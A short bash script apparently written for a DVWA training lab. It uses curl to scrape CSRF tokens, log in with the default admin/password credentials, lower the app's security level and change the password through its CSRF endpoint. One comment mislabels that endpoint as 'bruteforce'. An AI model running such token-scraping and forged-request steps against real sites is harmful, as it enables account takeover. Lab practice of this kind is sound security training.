#Login with the found login
CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie -d $"username=admin&password=password&Login=Login&user_token=${CSRF}" 192.168.178.98/dvwa/login.php > /dev/null
#Change the security level to low (impossible by default)
CSRFSEC=$(curl -s -i -L -c dvwa.cookie.low -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONIDSEC=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie.low -c dvwa.cookie.low -d $"security=low&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
#Check out the "bruteforce" page
curl -s -i -L -b dvwa.cookie.low 192.168.178.98/dvwa/vulnerabilities/csrf/ > /dev/null
curl -s -i -L -b dvwa.cookie.low "192.168.178.98/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" > result
rm -f dvwa*